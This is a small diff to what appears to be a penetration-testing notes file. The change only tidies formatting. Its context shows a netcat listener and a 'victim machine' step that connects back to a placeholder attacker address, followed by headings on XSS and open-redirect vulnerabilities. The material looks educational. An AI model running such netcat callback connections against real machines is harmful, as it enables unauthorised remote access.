@@ -68,8 +68,9 @@ Linux:
 nc -lvp 9998
 Try to establish a connection using netcat on the victim machine:
 Linux:
-nc YOUR_IP_ADDRESS 9998
- ### if r==6
+nc YOUR_IP_ADDRESS 9998.
+
+### if r==6
 ###xss Cross-site scripting attack
 ###Open redirect vulnerability:
 Explicit redirection vulnerabilities occur when an application insecurely incorporates user-controllable data into a redirection destination.
